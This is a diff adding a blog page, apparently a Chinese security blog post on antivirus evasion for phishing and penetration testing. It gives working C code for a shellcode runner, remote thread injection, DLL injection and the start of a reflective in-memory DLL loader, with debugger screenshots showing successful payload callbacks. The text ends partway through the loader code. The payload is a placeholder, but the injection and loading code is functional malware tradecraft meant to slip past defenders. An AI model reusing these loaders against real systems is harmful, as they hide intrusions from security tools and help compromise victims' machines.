@@ -1,0 +1,299 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>关于免杀的技术总结（-） | 藏青&#39;s BLOG</title>
+
+  
+  <meta name="author" content="藏青">
+  
+
+  
+  <meta name="description" content="知行合一">
+  
+
+  
+  <meta name="keywords" content="渗透 内网 代码审计">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="关于免杀的技术总结（-）"/>
+
+  <meta property="og:site_name" content="藏青&#39;s BLOG"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="藏青&#39;s BLOG" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">藏青&#39;s BLOG</a>
+    </h1>
+    <p class="site-description"></p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">Home</a></li>
+      
+        <li><a href="/archives">Archives</a></li>
+      
+        <li><a href="/categories">Categories</a></li>
+      
+        <li><a href="/links">Links</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>关于免杀的技术总结（-）</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2020/11/09/关于免杀的技术总结（-）/" rel="bookmark">
+        <time class="entry-date published" datetime="2020-11-09T12:26:00.000Z">
+          2020-11-09
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p>​    在钓鱼或者渗透的过程中，如果我们不会免杀，使用Cobaltstrike生成的exe可能直接就被干掉了，还会触发目标的告警，导致之前的工作前功尽弃，因此在往更高阶的攻防对抗中，免杀能力是必不可少的能力，不是说每个人都必须掌握这种能力，但是如果一个团队中，一个会免杀的人都没有，那就很僵了。</p>
+<p>​    回到正题，本片文章并不会讲到免杀方法可能很多已经都不可用了，之所以写这篇总结文章，是希望大家能对免杀的方法能有一个系统的认知。</p>
+<h2 id="远程线程调用"><a href="#远程线程调用" class="headerlink" title="远程线程调用"></a>远程线程调用</h2><p>​    要讲远程线程调用，我们首先看一下本地的调用，代码如下：</p>
+<span id="more"></span>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &quot;Windows.h&quot;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	unsigned char shellcode[] =&quot;shellcode&quot;;</span><br><span class="line">	void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	memcpy(exec, shellcode, sizeof shellcode);</span><br><span class="line">	((void(*)())exec)();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    上面的代码中用到了几个函数，我大致讲一下：</p>
+<p><strong>VirtualAlloc</strong></p>
+<p>​    VirtualAlloc函数通常可以用来分配大块的指定大小的内存，它包含如下参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">参数一：要分配的内存区域的地址</span><br><span class="line">参数二：要分配的大小</span><br><span class="line">参数三：要分配的类型 当使用MEM_COMMIT时，代表分配物理内存，并初始化为0，</span><br><span class="line">参数四：内存的初始保护属性 当设置为PAGE_EXECUTE时，代表这个区域的代码可执行，但不可读写。</span><br></pre></td></tr></table></figure>
+
+<p>​    也就是当我们执行VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE)时，就会给我们分配大小为sizeof shellcode大小的内存块，并且初始化为0，并且该内存具有执行权限。</p>
+<p>​    我做了一个测试，下面执行后我们分配的地址是0x009e0000</p>
+<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201109204919240.png" alt="image-20201109204919240"></p>
+<p>​    我们查看这个地址，可以看到这个地址确实被分配了一大块的内存，并且内容为空。</p>
+<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201109205007124.png" alt="image-20201109205007124"></p>
+<p><strong>memcpy</strong></p>
+<p>​    memcpy用来从str2中赋值n个字节数据到str1中。其中str1和str2的类型为指针类型。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void *memcpy(void *str1, const void *str2, size_t n)</span><br></pre></td></tr></table></figure>
+
+<p>​    知道了这个以后，我们就可以知道，当执行memcpy(exec, shellcode, sizeof shellcode) 时，会将长度为sizeof shellcode内容为shellcode的内容复制到exec这个指针所指的位置。</p>
+<p>​    shellcode指针指向的地址为0x005cfadc，地址内容如下：</p>
+<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201109205508511.png" alt="image-20201109205508511"></p>
+<p>​    当执行完memcpy后，我们可以看到，将0x005cfadc内存中的部分数据拷贝到了0x009e0000内存中。</p>
+<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201109205618924.png" alt="image-20201109205618924"></p>
+<p>​    最后我们再看下((void(*)())exec)()大致的意思是将exec这个指针强制转换为函数指针，然后调用这个函数，最终我们的代码得到了执行。</p>
+<p>​    我们再来看一下远程线程注入的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;Windows.h&quot;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	unsigned char shellcode[] =&quot;shellcode&quot;;</span><br><span class="line">	HANDLE processHandle;</span><br><span class="line">	HANDLE remoteThread;</span><br><span class="line">	PVOID remoteBuffer;</span><br><span class="line">	printf(&quot;Injecting to PID: %i&quot;, atoi(argv[1]));</span><br><span class="line">	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));</span><br><span class="line">	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span><br><span class="line">	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);</span><br><span class="line">	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);</span><br><span class="line">	CloseHandle(processHandle);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    在上面的代码中，同样调用了几个windows函数，想要理解上面的代码做了什么，首先需要了解这几个windows 函数的功能。</p>
+<p><strong>OpenProcess</strong></p>
+<p>​    OpenProcess用来打开一个已经存在的进程对象，并返回进程的句柄，这个函数的原型如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HANDLE OpenProcess(</span><br><span class="line">DWORD dwDesiredAccess, //访问权限（标志）</span><br><span class="line">BOOL bInheritHandle, // 是否继承句柄</span><br><span class="line">DWORD dwProcessId// 进程标示符</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>dwDesiredAccess代表获取的访问权限，PROCESS_ALL_ACCESS代表获取所有权限。bInheritHandle代表是否继承句柄为boolean类型，dwProcessId代表进程的id。penProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])))的意思就是获取进程id为argv[1]的进程对象的所有的权限，并返回进程的句柄。</p>
+<p><strong>VirtualAllocEx</strong></p>
+<p>​    通过这个函数，我们可以在我们获取的进程对象中分配内存。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LPVOID VirtualAllocEx(</span><br><span class="line">  HANDLE hProcess,//我们想要分配内存的进程</span><br><span class="line">  LPVOID lpAddress,//受害者进程内存中指定地址的指针</span><br><span class="line">  SIZE_T dwSize,//分配的内存区域的大小</span><br><span class="line">  DWORD  flAllocationType,//指定要分配的内存类型</span><br><span class="line">  DWORD  flProtect//它指定分配的内存保护,我们将其设置为PAGE_EXECUTE_READWRITE。</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>​    通过执行VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE)，我们可以在processHandle指向的进程中分配一块内存，并且设置内存为可执行权限，当函数执行成功，则返回分配内存的首地址，不成功则返回null。当我们执行完内存分配后remoteBuffer中会有一个地址，但是这个地址并不是我们当前进程的地址，而是notepad的地址。</p>
+<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110105814469.png" alt="image-20201110105814469"></p>
+<p>​    我们使用hxd来查看这个地址的内容</p>
+<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110105919797.png" alt="image-20201110105919797"></p>
+<p><strong>WriteProcessMemory</strong></p>
+<p>​    <code>WriteProcessMemory</code>是一个将数据写入指定进程的内存区域的函数。需要注意的是整个内存区域必须是可写的，否则会失败。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BOOL WriteProcessMemory(</span><br><span class="line">      HANDLE  hProcess,//我们想要写入数据的进程</span><br><span class="line">  LPVOID  lpBaseAddress,//我们想要写入数据的地址</span><br><span class="line">  LPCVOID lpBuffer,//指向必须写入的数据的指针</span><br><span class="line">  SIZE_T  nSize,//写入的数据量</span><br><span class="line">  SIZE_T  *lpNumberOfBytesWritten//指向SIZE_T的指针，它将存储写入该目标的字节数。</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>​    按照上面的理解，当我们执行完WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL)后，会在processHandle进程中开辟的空间remoteBuffer中写入大小为sizeof shellcode,内容为shellcode的数据。调用后成功将shellcode写入到notepad的内存中</p>
+<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110110155310.png" alt="image-20201110110155310"></p>
+<p><strong>CreateRemoteThread</strong></p>
+<p>​    CreateRemoteThread在另一个进程的虚拟空间中创建一个线程。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HANDLE CreateRemoteThread(</span><br><span class="line">  HANDLE                 hProcess,// 目标进程句柄</span><br><span class="line">  LPSECURITY_ATTRIBUTES  lpThreadAttributes,// 安全属性</span><br><span class="line">  SIZE_T                 dwStackSize, // 进程堆栈大小</span><br><span class="line">  LPTHREAD_START_ROUTINE lpStartAddress,  // 进程函数</span><br><span class="line">  LPVOID                 lpParameter, // 进程参数</span><br><span class="line">  DWORD                  dwCreationFlags, // 创建标志</span><br><span class="line">  LPDWORD                lpThreadId // 参数返回ID</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>​    当执行下面的操作时，则会执行remoteBuffer指向的内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);</span><br></pre></td></tr></table></figure>
+
+<p>​    最后调用CreateRemoteThread,成功上线，但是这里有一个问题，因为我们现在使用windows创建的notepad为64位，所以我们要编译的这个exe也应该是64位，否则调用CreateRemoteThread会返回0调用失败。</p>
+<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110110250322.png" alt="image-20201110110250322"></p>
+<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110110331437.png" alt="image-20201110110331437"></p>
+<h2 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h2><p>​    首先给出DLL注入的代码，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc, char* argv[]) &#123;</span><br><span class="line">	HANDLE processHandle;</span><br><span class="line">	PVOID remoteBuffer;</span><br><span class="line">	wchar_t dllPath[] = TEXT(&quot;C:\\experiments\\evilm64.dll&quot;);</span><br><span class="line"></span><br><span class="line">	printf(&quot;Injecting DLL to PID: %i\n&quot;, atoi(argv[1]));</span><br><span class="line">	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));</span><br><span class="line">	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);</span><br><span class="line">	PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT(&quot;Kernel32&quot;)), &quot;LoadLibraryW&quot;);</span><br><span class="line">	CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);</span><br><span class="line">	CloseHandle(processHandle);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    通过查看上面的代码，我们可以看出上面的代码和远程线程调用的代码类似，不同的是将shellcode数组的地址转换为dll的路径。还有就是调用了GetProcAddress这个函数，我们先了解一下这个函数。</p>
+<p><strong>GetProcAddress</strong></p>
+<p>​    GetProcAddress是一个计算机函数，功能是检索指定的动态链接库(DLL)中的输出<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%BA%93%E5%87%BD%E6%95%B0/3471322">库函数</a>地址。lpProcName参数能够识别DLL中的函数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FARPROC GetProcAddress(</span><br><span class="line">HMODULE hModule, // DLL模块句柄</span><br><span class="line">LPCSTR lpProcName // 函数名</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>​    然后我们再来理解一下GetProcAddress(GetModuleHandle(TEXT(“Kernel32”)), “LoadLibraryW”);也就是获取LoadLibraryW函数的地址，LoadLibraryW函数的功能可以加载指定路径的DLL文件。之所以没有直接调用LoadLibraryW函数，是因为这个函数不能直接调用，只能查找这个函数名称所在的内存地址进行调用。</p>
+<p>​    所以使用DLL注入的过程大概是这样的</p>
+<ul>
+<li><p>OpenProcess 找到我们想要注入进程的句柄，获取权限</p>
+</li>
+<li><p>VirtualAllocEx 分配内存，用来存放我们DLL的路径</p>
+</li>
+<li><p>WriteProcessMemory 将DLL的路径写入分配的内存</p>
+</li>
+<li><p>GetProcAddress 获取LoadLibraryW这个库函数的地址</p>
+</li>
+<li><p>CreateRemoteThread 使用LoadLibraryW加载DLL执行</p>
+<p>我们调试一下，看和我们分析的结果是否相同，首先在执行完VirtualAllocEx 会分配一块内存</p>
+</li>
+</ul>
+<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110151824300.png" alt="image-20201110151824300"></p>
+<p>​    我们使用HXD找到这块内存，看是否分配成功，如下所示：</p>
+<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110151807657.png" alt="image-20201110151807657"></p>
+<p>​    再继续执行，WriteProcessMemory函数执行后，会再该内存写入我们DLL的地址</p>
+<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110151957686.png" alt="image-20201110151957686"></p>
+<p>​    最后，当我们调用CreateRemoteThread后，成功上线。</p>
+<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110152028142.png" alt="image-20201110152028142"></p>
+<p><img src="/2020/11/09/%E5%85%B3%E4%BA%8E%E5%85%8D%E6%9D%80%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%88-%EF%BC%89/image-20201110152054110.png" alt="image-20201110152054110"></p>
+<h2 id="反射DLL注入"><a href="#反射DLL注入" class="headerlink" title="反射DLL注入"></a>反射DLL注入</h2><p>​    上面我们演示的DLL注入技术有一个很明显的缺陷，那就是必须让我们的DLL在目标的硬盘上，直接将我们恶意的DLL放到硬盘中，无疑加大了被查杀的风险，因此下来我们来了解一下不落地执行DLL的方法，那就是反射DLL注入技术，它允许我们从内存中向受害者进程注入DLL。</p>
+<p>​    我们先看一下简单的反射DLL的栗子，首先使用vs创建一个DLL项目，代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">BOOL APIENTRY DllMain(HMODULE hModule,</span><br><span class="line">    DWORD  ul_reason_for_call,</span><br><span class="line">    LPVOID lpReserved</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">    &#123;</span><br><span class="line">        MessageBoxA(NULL, &quot;注入成功!&quot;, &quot;提示&quot;, MB_OK);</span><br><span class="line">    &#125;</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    上面的代码内容比较简单，当调用这个DLL时，会弹出一个框提示注入成功，重点在下面的代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">typedef struct BASE_RELOCATION_BLOCK &#123;</span><br><span class="line">	DWORD PageAddress;</span><br><span class="line">	DWORD BlockSize;</span><br><span class="line">&#125; BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;</span><br><span class="line"></span><br><span class="line">typedef struct BASE_RELOCATION_ENTRY &#123;</span><br><span class="line">	USHORT Offset : 12;</span><br><span class="line">	USHORT Type : 4;</span><br><span class="line">&#125; BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;</span><br><span class="line"></span><br><span class="line">using DLLEntry = BOOL(WINAPI*)(HINSTANCE dll, DWORD reason, LPVOID reserved);</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	// get this module&#x27;s image base address</span><br><span class="line">	PVOID imageBase = GetModuleHandleA(NULL);</span><br><span class="line"></span><br><span class="line">	// load DLL into memory</span><br><span class="line">	HANDLE dll = CreateFileA(&quot;\\\\VBOXSVR\\Experiments\\MLLoader\\MLLoader\\x64\\Debug\\dll.dll&quot;, GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);</span><br><span class="line">	DWORD64 dllSize = GetFileSize(dll, NULL);</span><br><span class="line">	LPVOID dllBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllSize);</span><br><span class="line">	DWORD outSize = 0;</span><br><span class="line">	ReadFile(dll, dllBytes, dllSize, &amp;outSize, NULL);</span><br><span class="line"></span><br><span class="line">	// get pointers to in-memory DLL headers</span><br><span class="line">	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)dllBytes;</span><br><span class="line">	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBytes + dosHeaders-&gt;e_lfanew);</span><br><span class="line">	SIZE_T dllImageSize = ntHeaders-&gt;OptionalHeader.SizeOfImage;</span><br><span class="line"></span><br><span class="line">	// allocate new memory space for the DLL. Try to allocate memory in the image&#x27;s preferred base address, but don&#x27;t stress if the memory is allocated elsewhere</span><br><span class="line">	//LPVOID dllBase = VirtualAlloc((LPVOID)0x000000191000000, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	LPVOID dllBase = VirtualAlloc((LPVOID)ntHeaders-&gt;OptionalHeader.ImageBase, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">	// get delta between this module&#x27;s image base and the DLL that was read into memory</span><br><span class="line">	DWORD_PTR deltaImageBase = (DWORD_PTR)dllBase - (DWORD_PTR)ntHeaders-&gt;OptionalHeader.ImageBase;</span><br><span class="line"></span><br><span class="line">	// copy over DLL image headers to the newly allocated space for the DLL</span><br><span class="line">	std::memcpy(dllBase, dllBytes, ntHeaders-&gt;OptionalHeader.SizeOfHeaders);</span><br><span class="line"></span><br><span class="line">	// copy over DLL image sections to the newly allocated space for the DLL</span><br><span class="line">	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);</span><br><span class="line">	for (size_t i = 0; i &lt; ntHeaders-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		LPVOID sectionDestination = (LPVOID)((DWORD_PTR)dllBase + (DWORD_PTR)section-&gt;VirtualAddress);</span><br><span class="line">		LPVOID sectionBytes = (LPVOID)((DWORD_PTR)dllBytes + (DWORD_PTR)section-&gt;PointerToRawData);</span><br><span class="line">		std::memcpy(sectionDestination, sectionBytes, section-&gt;SizeOfRawData);</span><br><span class="line">		section++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// perform image base relocations</span><br><span class="line">	IMAGE_DATA_DIRECTORY relocations = ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];</span><br><span class="line">	DWORD_PTR relocationTable = relocations.VirtualAddress + (DWORD_PTR)dllBase;</span><br><span class="line">	DWORD relocationsProcessed = 0;</span><br><span class="line"></span><br><span class="line">	while (relocationsProcessed &lt; relocations.Size)</span><br><span class="line">	&#123;</span><br><span class="line">		PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);</span><br><span class="line">		relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);</span><br><span class="line">		DWORD relocationsCount = (relocationBlock-&gt;BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);</span><br><span class="line">		PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);</span><br><span class="line"></span><br><span class="line">		for (DWORD i = 0; i &lt; relocationsCount; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			